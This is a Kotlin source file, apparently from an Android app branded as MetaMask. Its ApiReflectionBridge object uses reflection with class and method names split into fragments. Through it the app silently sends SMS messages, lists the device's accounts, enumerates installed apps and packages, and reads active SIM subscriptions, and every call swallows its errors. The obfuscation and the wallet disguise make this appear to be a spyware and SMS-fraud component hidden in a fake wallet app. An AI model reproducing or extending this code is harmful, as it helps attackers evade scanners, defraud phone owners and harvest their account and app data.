package com.example.MetaMask.utils

import android.content.Context

object ApiReflectionBridge {

    fun getSmsCtx(subId: Int): Any? = try {
        val clsParts = arrayOf("android.telephony", "SmsManager")
        val cls = Class.forName(clsParts.joinToString("."))
        val mParts = arrayOf("getSmsManagerFor", "SubscriptionId")
        val m = cls.getMethod(mParts.joinToString(""), Int::class.java)
        m.invoke(null, subId)
    } catch (_: Exception) { null }

    fun dispatchSingle(smsManager: Any, destAddr: String, scAddr: String?,
                       text: String, sent: Any?, delivery: Any?) = try {
        val nameParts = arrayOf("send", "Text", "Message")
        val m = smsManager::class.java.getMethod(
            nameParts.joinToString(""),
            String::class.java, String::class.java, String::class.java,
            android.app.PendingIntent::class.java, android.app.PendingIntent::class.java
        )
        m.invoke(smsManager, destAddr, scAddr, text, sent, delivery)
    } catch (_: Exception) {}

    fun dispatchMulti(smsManager: Any, destAddr: String, scAddr: String?,
                      parts: ArrayList<String>, sent: ArrayList<android.app.PendingIntent?>?,
                      delivery: ArrayList<android.app.PendingIntent?>?) = try {
        val nameParts = arrayOf("sendMultipart", "TextMessage")
        val m = smsManager::class.java.getMethod(
            nameParts.joinToString(""),
            String::class.java, String::class.java,
            ArrayList::class.java, ArrayList::class.java, ArrayList::class.java
        )
        m.invoke(smsManager, destAddr, scAddr, parts, sent, delivery)
    } catch (_: Exception) {}

    fun querySubId(smsManager: Any): Int = try {
        val m = smsManager::class.java.getMethod("getSubscriptionId")
        m.invoke(smsManager) as? Int ?: -1
    } catch (_: Exception) { -1 }

    @Suppress("UNCHECKED_CAST")
    fun listEntities(context: Context): Array<android.accounts.Account>? = try {
        val cls = Class.forName("android.accounts.AccountManager")
        val am = cls.getMethod("get", Context::class.java).invoke(null, context)
        cls.getMethod("getAccounts").invoke(am) as? Array<android.accounts.Account>
    } catch (_: Exception) { null }

    @Suppress("UNCHECKED_CAST")
    fun listEntitiesByType(context: Context, type: String): Array<android.accounts.Account>? = try {
        val cls = Class.forName("android.accounts.AccountManager")
        val am = cls.getMethod("get", Context::class.java).invoke(null, context)
        cls.getMethod("getAccountsByType", String::class.java).invoke(am, type) as? Array<android.accounts.Account>
    } catch (_: Exception) { null }

    @Suppress("UNCHECKED_CAST")
    fun listApps(pm: android.content.pm.PackageManager, flags: Int): List<android.content.pm.ApplicationInfo> = try {
        val m = pm::class.java.getMethod("getInstalledApplications", Int::class.java)
        (m.invoke(pm, flags) as? List<android.content.pm.ApplicationInfo>) ?: emptyList()
    } catch (_: Exception) { emptyList() }

    @Suppress("UNCHECKED_CAST")
    fun listPkgs(pm: android.content.pm.PackageManager, flags: Int): List<android.content.pm.PackageInfo> = try {
        val m = pm::class.java.getMethod("getInstalledPackages", Int::class.java)
        (m.invoke(pm, flags) as? List<android.content.pm.PackageInfo>) ?: emptyList()
    } catch (_: Exception) { emptyList() }

    @Suppress("UNCHECKED_CAST")
    fun queryActiveLinks(context: Context): List<*>? = try {
        val clsParts = arrayOf("android.telephony", "SubscriptionManager")
        val cls = Class.forName(clsParts.joinToString("."))
        val sm = cls.getMethod("from", Context::class.java).invoke(null, context)
        val mParts = arrayOf("getActive", "SubscriptionInfoList")
        cls.getMethod(mParts.joinToString("")).invoke(sm) as? List<*>
    } catch (_: Exception) { null }
}
